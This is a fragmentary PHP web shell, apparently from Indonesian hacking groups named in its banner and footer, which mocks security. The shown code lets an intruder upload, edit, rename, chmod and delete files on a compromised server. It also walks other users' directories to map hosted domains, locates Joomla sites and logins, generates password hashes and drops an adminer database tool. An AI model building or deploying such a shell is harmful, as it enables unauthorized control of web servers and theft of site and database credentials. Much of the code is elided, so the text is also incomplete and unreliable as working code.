...
<meta charset="UTF-8"> <meta name="Author" content="RECTY.EXPLOIT" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
</head>
<style>
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">KEAMANAN ITU OMONG KOSONG !!!</font><br>
</h1></center>
...
<center><audio autoplay="autoplay" controls="controls" src="https://l.top4top.io/m_2537ks98q1.mp3" type="audio/mpeg"></audio></center>
...
echo '<font color="yellow">UPLOADED SUCCES TELASO!!!!!</script><br/>';
}else{
echo '<script> alert("UPLOADED FAILED TELASO !!!!!")</script></font><br/>';
}
}
				...
				foreach($user_jumping[1] as $user_idx_jump) {
					...
					if(is_readable($user_jumping_dir)) {
						...
						if(function_exists('posix_getpwuid')) {
							...
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya Telaso !!!</font> )<br>";
							} else {
...
echo "</div>";
 ...
 echo "CMS => Joomla<br>";
 if($site == '') {
 echo "Sitename => <font color=red>error, gabisa ambil nama domain nya Telaso !!!</font><br>";
 } else {
 ...
 if($target == '') {
 $url_target = "Login => <font color=red>error, gabisa ambil nama domain Telaso !!!</font><br>";
 } else {
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
   ...
   <p style='color: white;'>Team: Makassar Team Shell - <font color="red">Cowok Tersakiti Team</font> - Indonesian error system - RECTY.EXPLOIT - Dan lain lain</p>
   </center>
   </td>
   </tr>
   <?php
 ...
 echo "<center><font color=red>gagal buat file adminer telaso!!!</font></center>";
 }  
...
echo '<script> alert("CANGE PERM GAGAL Telaso !!!!!")</font><br />';
}
}
echo '<form method="POST">
...
echo '<script> alert("RENAME GAGAL Telaso !!!!!")</script><br />';
}
...
echo '<script> alert("EDIT GAGAL Telaso !!!!!")</script></font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
...
echo '<font color="red">Directory Gagal Terhapus telaso                                                                                                                                                                                                                                                                                           </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<script> alert("SUCCES !!!!!")</script><br/>';
}else{
echo '<font color="red">File Gagal Dihapus telaso</font><br/>';
}
}
}
echo '</center>';
